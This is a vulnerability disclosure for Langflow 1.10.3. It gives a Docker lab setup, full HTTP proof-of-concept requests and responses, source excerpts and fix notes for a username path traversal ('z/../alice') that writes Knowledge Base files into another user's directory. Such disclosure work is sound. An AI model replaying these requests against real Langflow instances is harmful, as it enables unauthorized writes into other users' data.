### Vulnerability details

**Official website / Product:** https://www.langflow.org/

**Repository:** langflow-ai/langflow (stars at selection: 156267)

**Vulnerability type:** file_upload / arbitrary file write (cross-user Knowledge Base path join via residual username `../`)

**Vulnerability versions:** Docker-verified `langflowai/langflow:1.10.3`; residual still present on main `b5c54a64e685b7e50fd3bc76e965ad718fc2dea3` (`resolve_local_store_path` + unsanitized `User.username`; `validate_kb_name` applies to kb_name only)

**Vulnerability URL / Parameter:**
1. `POST /api/v1/users/` — JSON `username` (accepts `/` and `..`, e.g. `z/../alice`)
2. `POST /api/v1/login` — `application/x-www-form-urlencoded` `username`/`password` for a Bearer access token (URL-encode `/` in the username)
3. `POST /api/v1/knowledge_bases/` — authenticated create of a local Chroma KB; server joins `current_user.username` into the path and writes `embedding_metadata.json` + `chroma.sqlite3`

**Complex:** yes

### Verification procedure

1. From the campaign root start the lab (equivalent tree: `labs/langflow-r77-a2/`). Image `langflowai/langflow:1.10.3` + `postgres:16-trixie`; containers `langflow-r77-a2-langflow-1` / `langflow-r77-a2-postgres-1`; host **25702→7860**; `LANGFLOW_AUTO_LOGIN=false`, `LANGFLOW_ENABLE_SIGNUP=true`, `LANGFLOW_NEW_USER_IS_ACTIVE=true`, `LANGFLOW_DATABASE_URL=postgresql://langflow:langflow@postgres:5432/langflow`, `LANGFLOW_SUPERUSER=admin` / `LANGFLOW_SUPERUSER_PASSWORD=AdminPass123!`, `LANGFLOW_SECRET_KEY=r77a2-lab-secret-key-not-for-prod`. Note: hosts lacking x86-64-v3 abort on official `latest`/1.11+/1.12+ (glibc); verification is pinned to 1.10.3. You can also rebuild compose in a temp dir:

```bash
mkdir -p /tmp/langflow-r77-a2-lab && cd /tmp/langflow-r77-a2-lab
cat > docker-compose.yml <<'EOF'
services:
  langflow:
    image: langflowai/langflow:1.10.3
    ports:
      - "25702:7860"
    depends_on:
      - postgres
    environment:
      - LANGFLOW_DATABASE_URL=postgresql://langflow:langflow@postgres:5432/langflow
      - LANGFLOW_CONFIG_DIR=/app/langflow
      - LANGFLOW_AUTO_LOGIN=false
      - LANGFLOW_ENABLE_SIGNUP=true
      - LANGFLOW_NEW_USER_IS_ACTIVE=true
      - LANGFLOW_SUPERUSER=admin
      - LANGFLOW_SUPERUSER_PASSWORD=AdminPass123!
      - LANGFLOW_SECRET_KEY=r77a2-lab-secret-key-not-for-prod
    volumes:
      - langflow-data:/app/langflow
  postgres:
    image: postgres:16-trixie
    environment:
      POSTGRES_USER: langflow
      POSTGRES_PASSWORD: langflow
      POSTGRES_DB: langflow
    volumes:
      - langflow-postgres:/var/lib/postgresql/data
volumes:
  langflow-postgres:
  langflow-data:
EOF
docker compose up -d
```

Expect compose bring-up with `langflow-r77-a2-postgres-1` / `langflow-r77-a2-langflow-1` Created/Started (or equivalent names under the temp dir), port `0.0.0.0:25702->7860/tcp`.

2. After the stack is ready, register victim user `alice` (any password works; example `AlicePass123!`) so the KB namespace is `<knowledge_bases_dir>/alice/`:

```http
POST /api/v1/users/ HTTP/1.1
Host: 127.0.0.1:25702
Content-Type: application/json
Accept: application/json
Content-Length: 47
Connection: close

{"username":"alice","password":"AlicePass123!"}
```

3. Attacker signs up as `z/../alice` (`POST /api/v1/users/` → 201; username stored literally).
4. Attacker calls `POST /api/v1/login` (form-urlencoded; username as `z%2F..%2Falice`) and obtains a Bearer `access_token` (the JWT in the create request below is a lab snapshot — replace it with the token from this login).
5. Attacker calls `POST /api/v1/knowledge_bases/` with `backend_type=chroma` and `name=afw_create_only`. Create alone writes files; a real OpenAI API key is not required for the AFW proof.
6. Confirm on-disk write under the **victim** namespace:

```bash
docker compose exec langflow \
  sh -c 'ls -la /app/data/.langflow/knowledge_bases/alice/afw_create_only/; cat /app/data/.langflow/knowledge_bases/alice/afw_create_only/embedding_metadata.json'
```

Expect `embedding_metadata.json` (id matches the create response) and `chroma.sqlite3` (~188416 bytes) at `/app/data/.langflow/knowledge_bases/alice/afw_create_only/` (not under a separate attacker directory). Expected on-disk output sample:

```text
Impact: attacker username z/../alice creates KB files under victim alice/ namespace
Written by create alone:
total 196
drwxr-xr-x 2 user root   4096 Nov  2 21:37 .
drwxr-xr-x 7 user root   4096 Nov  2 21:37 ..
-rw-r--r-- 1 user root 188416 Nov  2 21:37 chroma.sqlite3
-rw-r--r-- 1 user root    373 Nov  2 21:37 embedding_metadata.json
```

### Complete vulnerability PoC

Prerequisite A: register the traversal username (Docker-verified):

```http
POST /api/v1/users/ HTTP/1.1
Host: 127.0.0.1:25702
Content-Type: application/json
Accept: application/json
Content-Length: 53
Connection: close

{"username":"z/../alice","password":"AttackPass123!"}
```

Signup response (Docker-verified; `username` stored as `z/../alice`; `id` becomes JWT `sub`):

```http
HTTP/1.1 201 Created
date: Mon, 02 Nov 2026 21:35:52 GMT
server: uvicorn
content-length: 336
content-type: application/json

{"id":"65e61495-4ca9-4f3a-b9e1-018502ff6266","username":"z/../alice","profile_image":null,"store_api_key":null,"is_active":true,"is_superuser":false,"create_at":"2026-11-02T21:35:53.538177","updated_at":"2026-11-02T21:35:53.538184","last_login_at":null,"optins":{"github_starred":false,"dialog_dismissed":false,"discord_clicked":false}}
```

Prerequisite B: login for an access token (OAuth2PasswordRequestForm; replace the next Authorization header with the returned `access_token`):

```http
POST /api/v1/login HTTP/1.1
Host: 127.0.0.1:25702
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Content-Length: 47
Connection: close

username=z%2F..%2Falice&password=AttackPass123!
```

Expected JSON includes `access_token` / `refresh_token` / `token_type` (and may Set-Cookie `access_token_lf` / `refresh_token_lf`).

Complete HTTP request (Docker-verified) — create that performs the cross-user write:

```http
POST /api/v1/knowledge_bases/ HTTP/1.1
Host: 127.0.0.1:25702
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2NWU2MTQ5NS00Y2E5LTRmM2EtYjllMS0wMTg1MDJmZjYyNjYiLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzkzNjU4OTUzfQ.bUa5XierXHheVbxeP2vXjlVVsWAGhIQIppBVOKQR2ls
Content-Type: application/json
Accept: application/json
Content-Length: 143
Connection: close

{"name":"afw_create_only","embedding_provider":"OpenAI","embedding_model":"text-embedding-3-small","backend_type":"chroma","backend_config":{}}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 201 Created
date: Mon, 02 Nov 2026 21:37:27 GMT
server: uvicorn
content-length: 435
content-type: application/json

{"id":"5b7e6946-186f-4dd7-a1de-332acd66184d","dir_name":"afw_create_only","name":"afw create only","embedding_provider":"OpenAI","embedding_model":"text-embedding-3-small","size":0,"words":0,"characters":0,"chunks":0,"avg_chunk_size":0.0,"chunk_size":null,"chunk_overlap":null,"separator":null,"status":"empty","failure_reason":null,"last_job_id":null,"source_types":[],"column_config":null,"backend_type":"chroma","backend_config":{}}
```

Verification result notes:

- Create alone writes into the victim path: `alice/afw_create_only/embedding_metadata.json` (id matches response `5b7e6946-186f-4dd7-a1de-332acd66184d`) and `chroma.sqlite3` (~188416 bytes).
- Attacker username is stored literally as `z/../alice`; after `Path.resolve()` the path is `<kb_root>/alice/...`, which still satisfies `is_relative_to(kb_root)`, so the root-escape guard allows it.
- Attacker-influenced content includes embedding/backend fields from the create body written into JSON, plus the initialized Chroma SQLite file.
- On-disk metadata sample:

```json
{
  "id": "5b7e6946-186f-4dd7-a1de-332acd66184d",
  "embedding_provider": "OpenAI",
  "embedding_model": "text-embedding-3-small",
  "model_selection": null,
  "created_at": "2026-11-02T21:37:27.467485+00:00",
  "chunks": 0,
  "words": 0,
  "characters": 0,
  "avg_chunk_size": 0.0,
  "size": 0,
  "column_config": null,
  "backend_type": "chroma",
  "backend_config": {}
}
```

### Vulnerability analysis

Local Chroma KB paths are `<kb_root>/<username>/<kb_name>`. CVE-2026-33186 / PR #13917 added username containment against `kb_root`, blocking root escapes such as `../../etc`. GHSA-79ph and related advisories constrain **kb_name** (`/`, `\`, `..`).

Residual: `UserCreate.username` / `UserUpdate.username` still accept path separators and `..`. Username `z/../alice` resolves inside `kb_root` into the victim `alice` directory, passes containment, then `mkdir` + `embedding_metadata.json.write_text` + Chroma init write attacker-influenced content into the victim namespace. Main added `validate_kb_name` for kb_name only; `resolve_local_store_path(kb_name, kb_username)` still joins the raw username.

Trigger / sink source (full path and line numbers; package paths inside Docker image `langflowai/langflow:1.10.3`):

```python
# File: langflow/services/database/models/user/model.py
# Lines: 72-77
class UserCreate(SQLModel):
    username: str = Field()
    password: str = Field()
    optins: dict[str, Any] | None = Field(
        default={"github_starred": False, "dialog_dismissed": False, "discord_clicked": False}
    )
```

```python
# File: langflow/api/v1/knowledge_bases.py
# Lines: 706-732 (create joins username + root containment)
async def create_knowledge_base(
    request: CreateKnowledgeBaseRequest,
    current_user: CurrentActiveUser,
) -> KnowledgeBaseInfo:
    """Create a new knowledge base with embedding configuration."""
    try:
        kb_root_path = KBStorageHelper.get_root_path()
        kb_user = current_user.username
        kb_name = request.name.strip().replace(" ", "_")
        await _guard_kb_action(
            current_user=current_user,
            action=KnowledgeBaseAction.CREATE,
            kb_name=kb_name or None,
        )
        if not kb_name or len(kb_name) < MIN_KB_NAME_LENGTH:
            raise HTTPException(status_code=400, detail="Knowledge base name must be at least 3 characters")

        kb_user_path = (kb_root_path / kb_user).resolve()
        kb_path = (kb_user_path / kb_name).resolve()
        _validate_kb_path_containment(kb_root_path.resolve(), kb_user_path, kb_name, kb_user)
        _validate_kb_path_containment(kb_user_path, kb_path, kb_name, kb_user)
```

```python
# File: langflow/api/v1/knowledge_bases.py
# Lines: 761-805 (mkdir + attacker-influenced metadata write + Chroma init)
        kb_path.mkdir(parents=True, exist_ok=True)
        KBStorageHelper.clear_deletion_sentinel(kb_path)
        kb_id = uuid.uuid4()

        try:
            client = KBStorageHelper.get_fresh_chroma_client(kb_path)
            client.create_collection(name=kb_name, **chroma_client_create_collection_kwargs())
        except (OSError, ValueError, chromadb.errors.ChromaError) as e:
            logger.warning("Initial Chroma setup for %s failed: %s", kb_name, e)
        finally:
            client = None
            KBStorageHelper.release_chroma_resources(kb_path)

        backend_type_value = request.backend_type or "chroma"
        backend_config_value = request.backend_config or {}
        embedding_metadata = {
            "id": str(kb_id),
            "embedding_provider": request.embedding_provider,
            "embedding_model": request.embedding_model,
            "model_selection": request.model_selection,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "chunks": 0,
            "words": 0,
            "characters": 0,
            "avg_chunk_size": 0.0,
            "size": 0,
            "column_config": column_config_dicts,
            "backend_type": backend_type_value,
            "backend_config": backend_config_value,
        }
        metadata_path = kb_path / "embedding_metadata.json"
        metadata_path.write_text(json.dumps(embedding_metadata, indent=2))
```

Equivalent residual on audited main (`b5c54a64e685b7e50fd3bc76e965ad718fc2dea3`):

```python
# File: src/backend/base/langflow/api/utils/kb_helpers.py
# Lines: 240-249
    kb_root = KBStorageHelper.get_root_path()
    kb_user_path = (kb_root / kb_username).resolve()
    kb_path = (kb_user_path / kb_name).resolve()
    validate_kb_path(kb_root, kb_user_path)
    validate_kb_path(kb_user_path, kb_path)

    if create:
        kb_path.mkdir(parents=True, exist_ok=True)
    return kb_path
```

### Fix notes

1. Reject `/`, `\`, `..`, `.`, and NUL in `UserCreate` / `UserUpdate` (and any other username write path); restrict to a single safe path segment (same bar as `validate_kb_name`).
2. Apply the same segment validation to **username** inside `resolve_local_store_path` / create, instead of relying only on `is_relative_to(kb_root)`.
3. Add regression tests for in-root cross-user forms (`z/../victim`, `./victim`, …), not only root-escape usernames (`../../etc`).
